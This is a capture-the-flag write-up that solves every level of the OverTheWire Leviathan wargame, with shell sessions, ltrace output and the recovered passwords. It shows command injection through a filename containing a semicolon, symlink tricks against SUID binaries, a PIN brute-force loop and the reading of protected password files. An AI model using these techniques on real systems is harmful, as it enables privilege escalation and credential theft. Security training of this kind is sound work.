# Leviathan

Write-up of the wargame Leviathan, which  can be found in [OverTheWire](https://overthewire.org/wargames/leviathan/).

Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed
on leviathan.labs.overthewire.org through SSH on port 2223.

The SSH banner shows a bunch of useful information:

```
Linux leviathan 4.18.12 x86_64 GNU/Linux
               
      ,----..            ,----,          .---. 
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' ' 
  |   :  | ; | ' ;    |.';  ; ;   \  \;      : 
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ; 
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"  
     \   \ .'        ;   |.'       \   \ ;     
  www. `---` ver     '---' he       '---" ire.org     
               
              
Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames. 
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with 
  easily guessable or short names will be periodically deleted!

  Please play nice:
      
    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS! 
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro 

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!
```

## First level

- Username: leviathan0
- Password: leviathan0

Upon loggin in we can see there are only some hidden files. One directory called
`.backup` looks particularly promising.

```bash
leviathan0@leviathan:~$ ls -al
total 24
drwxr-xr-x  3 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Aug 26  2019 .backup
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan0@leviathan:~$ ls -al .backup
total 140
drwxr-x--- 2 leviathan1 leviathan0   4096 Aug 26  2019 .
drwxr-xr-x 3 root       root         4096 Aug 26  2019 ..
-rw-r----- 1 leviathan1 leviathan0 133259 Aug 26  2019 bookmarks.html
```

The file `bookmarks.html` contains, as the name suggests, a list of bookmarks.
Some of the entries have comments. Anyway, the format is not really relevant.
The file is long so let's look for the token:

```bash
leviathan0@leviathan:~$ grep leviathan .backup/bookmarks.html 
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

Bingo! The password is there as clear-text.

## Second level

- Username: leviathan1
- Password: rioGegei8m

Oh boy! Somebody left an executable file with an active SUID bit. This means the
process will run as the owner of the file and not the user who starts it.
And this can lead to privilege scalation. Let's see how this works:

```bash
leviathan1@leviathan:~$ ./check 
password: asdf
Wrong password, Good Bye ...
```

It is asking the user for a password. If we run it using `ltrace` we can see
the system calls:

```bash
leviathan1@leviathan:~$ ltrace ./check 
__libc_start_main(0x804853b, 1, 0xffffd794, 0x8048610 <unfinished ...>
printf("password: ")                                                       = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: asdf
)                                          = 97
getchar(1, 0, 0x65766f6c, 0x646f6700)                                      = 115
getchar(1, 0, 0x65766f6c, 0x646f6700)                                      = 100
strcmp("asd", "sex")                                                       = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                           = 29
+++ exited (status 0) +++

```

Again, the password is compared against a hard-coded string. If we use it, a
shell is started as **leviathan2**, and we can read our "own" password file:

```bash
leviathan1@leviathan:~$ ./check 
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```

## Third level

- Username: leviathan2
- Password: ougahZi8Ta

Another SUID executable. Now it runs as **leviathan3**. The obvious take would
be to have it print the contents of the password file:

```bash
leviathan2@leviathan:~$ ls -l printfile 
-r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                 = -1
puts("You cant have that file..."You cant have that file...
)                                             = 27
+++ exited (status 1) +++
```

Right, it would have been too obvious. The developer prevented that. Let's see
what happens with other files:

```bash
leviathan2@leviathan:~$ ltrace ./printfile /etc/hosts
__libc_start_main(0x804852b, 2, 0xffffd784, 0x8048610 <unfinished ...>
access("/etc/hosts", 4)                                                  = 0
snprintf("/bin/cat /etc/hosts", 511, "/bin/cat %s", "/etc/hosts")        = 19
geteuid()                                                                = 12002
geteuid()                                                                = 12002
setreuid(12002, 12002)                                                   = 0
system("/bin/cat /etc/hosts"127.0.0.1   localhost packer-debian9
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                   = 0
+++ exited (status 0) +++
```

OK, so it uses `cat` under the hood and switches the user after checking for
file access. Let's see if we can print several files:

```bash
leviathan2@leviathan:~$ ltrace ./printfile /etc/hosts /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 3, 0xffffd764, 0x8048610 <unfinished ...>
access("/etc/hosts", 4)                                                  = 0
snprintf("/bin/cat /etc/hosts", 511, "/bin/cat %s", "/etc/hosts")        = 19
geteuid()                                                                = 12002
geteuid()                                                                = 12002
setreuid(12002, 12002)                                                   = 0
system("/bin/cat /etc/hosts"127.0.0.1   localhost packer-debian9
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                   = 0
+++ exited (status 0) +++
```

Apparently it only checks and prints the first parameter. And if we create a
file with a space in the name:

```bash
leviathan2@leviathan:~$ mkdir -p /tmp/deleteme
leviathan2@leviathan:~$ touch /tmp/deleteme/a\ test
leviathan2@leviathan:~$ ls -l /tmp/deleteme
total 0
-rw-r--r-- 1 leviathan2 root 0 Jan  9 18:42 a test
leviathan2@leviathan:~$ ltrace ./printfile /tmp/deleteme/a\ test 
__libc_start_main(0x804852b, 2, 0xffffd774, 0x8048610 <unfinished ...>
access("/tmp/deleteme/a test", 4)                                        = 0
snprintf("/bin/cat /tmp/deleteme/a test", 511, "/bin/cat %s", "/tmp/deleteme/a test") = 29
geteuid()                                                                = 12002
geteuid()                                                                = 12002
setreuid(12002, 12002)                                                   = 0
system("/bin/cat /tmp/deleteme/a test"/bin/cat: /tmp/deleteme/a: No such file or directory
/bin/cat: test: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                   = 256
+++ exited (status 0) +++
leviathan2@leviathan:~$ 
```

It checks the file access of the file I just created, it succeeds and then it
passes it to `cat` but **as two different files**.

> Note: do not use `ltrace` for the commands that are supposed to switch user,
as the scope seems to be messed up and you will not properly switch. This got me
scratching my head and researching for about half an hour.

### Method 1

If we create a softlink for the first part of the name, the password is shown:

```bash
leviathan2@leviathan:~$ cd /tmp/deleteme
leviathan2@leviathan:/tmp/deleteme$ ln -s /etc/leviathan_pass/leviathan3 /tmp/deleteme/a
leviathan2@leviathan:/tmp/deleteme$ ~/printfile "/tmp/deleteme/a test"
Ahdiemoo1j
/bin/cat: test: No such file or directory
```

### Method 2

We can also inject code. If instead of the space we use a semicolon we can run
commands as **leviathan3**.

```bash
leviathan2@leviathan:/tmp/deleteme$ touch "some;bash"
leviathan2@leviathan:/tmp/deleteme$ ~/printfile "some;bash"
/bin/cat: some: No such file or directory
leviathan3@leviathan:/tmp/deleteme$ whoami
leviathan3
leviathan3@leviathan:/tmp/deleteme$ cat /etc/leviathan_pass/leviathan3
Ahdiemoo1j
```

## Fourth level

- Username: leviathan3
- Password: Ahdiemoo1j

This challenge is way easier than the previous one. There is again a SUID binary
called `level3` asking for a password. Just use `ltrace` to show the password:

```bash
leviathan3@leviathan:~$ ltrace ./level3 
__libc_start_main(0x8048618, 1, 0xffffd794, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                          = -1
printf("Enter the password> ")                                      = 20
fgets(Enter the password> asdf
"asdf\n", 256, 0xf7fc55a0)                                          = 0xffffd5a0
strcmp("asdf\n", "snlprintf\n")                                     = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                                   = 19
+++ exited (status 0) +++
```
And use it to pop a shell as **leviathan4**:

```bash
leviathan3@leviathan:~$ ./level3 
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
$
```

## Fifth level

- Username: leviathan4
- Password: vuH0coox6m

There is a hidden SUID binary in `~/.trash` that prints some binary digits.

```bash
leviathan4@leviathan:~$ .trash/bin 
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
```
The program runs as **leviathan5** and opens the file we are after. If you have
been paying attention you will see that all the passwords we have seen so far
are exactly 10 characters long. The output consists in 11 numbers, each of them
made of 8 binary digits. This program might be taking each character of the
password and showing the binary representation of the byte used to encode it.
And since the last number is 0x0a, namely the ASCII code for '\n', the theory
seems plausible. But we need to convert that to a hexdump first.

Converting the binary digits to hexadecimal can be done with several tools. I
assume you are a turbo-chad and you are seeing the hex without the need of
additional tools. If not, you can just use a calculator.

The hexadecimal string would be:
54 69 74 68 34 63 6f 6b 65 69 0a

We now use `xxd` to reverse the hexdump:

```bash
leviathan4@leviathan:~$ echo "54 69 74 68 34 63 6f 6b 65 69 0a" | xxd -r -p
Tith4cokei
```
On to the next challenge.


## Sixth level

- Username: leviathan5
- Password: Tith4cokei

The binary in the home directory seems to look for a certain log:

```bash
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ touch /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5 
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                          = 0x804b008
fgetc(0x804b008)                                                     = '\377'
feof(0x804b008)                                                      = 1
fclose(0x804b008)                                                    = 0
getuid()                                                             = 12005
setuid(12005)                                                        = 0
unlink("/tmp/file.log")                                              = 0
+++ exited (status 0) +++
```
If we add content to the file we see it gets printed without further validation:

```bashleviathan5@leviathan:~$ echo "asdf" > /tmp/file.log;./leviathan5 
asdf
leviathan5@leviathan:~$ echo "asdf" > /tmp/file.log;ltrace ./leviathan5 
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                          = 0x804b008
fgetc(0x804b008)                                                     = 'a'
feof(0x804b008)                                                      = 0
putchar(97, 0x8048720, 0xf7e40890, 0x80486eb)                        = 97
fgetc(0x804b008)                                                     = 's'
feof(0x804b008)                                                      = 0
putchar(115, 0x8048720, 0xf7e40890, 0x80486eb)                       = 115
fgetc(0x804b008)                                                     = 'd'
feof(0x804b008)                                                      = 0
putchar(100, 0x8048720, 0xf7e40890, 0x80486eb)                       = 100
fgetc(0x804b008)                                                     = 'f'
feof(0x804b008)                                                      = 0
putchar(102, 0x8048720, 0xf7e40890, 0x80486eb)                       = 102
fgetc(0x804b008)                                                     = '\n'
feof(0x804b008)                                                      = 0
putchar(10, 0x8048720, 0xf7e40890, 0x80486ebasdf
)                                                                    = 10
fgetc(0x804b008)                                                     = '\377'
feof(0x804b008)                                                      = 1
fclose(0x804b008)                                                    = 0
getuid()                                                             = 12005
setuid(12005)                                                        = 0
unlink("/tmp/file.log")                                              = 0
+++ exited (status 0) +++
```

Then let's create a softlink that points to the target:

```bash
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log; ./leviathan5 
UgaoFee4li
```

Easy!

## Seventh level

- Username: leviathan6
- Password: UgaoFee4li

The binary for this challenge is requesting a 4-digit PIN. There is no sus
system calls this time, so I guess it is either bruteforcing the PIN or
disassembling the binary. Bruteforcing 10000 possibilities with a script is
easier :)

```bash
leviathan6@leviathan:~$ for i in {0000..9999};do echo $i;./leviathan6 $i;done
...
Wrong
7122
Wrong
7123
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
$ 
```

## Eighth level

- Username: leviathan7
- Password: ahy7MaeBo9

You were expecting another binary, weren't you? Maybe a final challenge? Not
here. You will find a text file congratulating you for successfuly finding the
final flag.

So if you made it this far, CONGRATULATIONS!
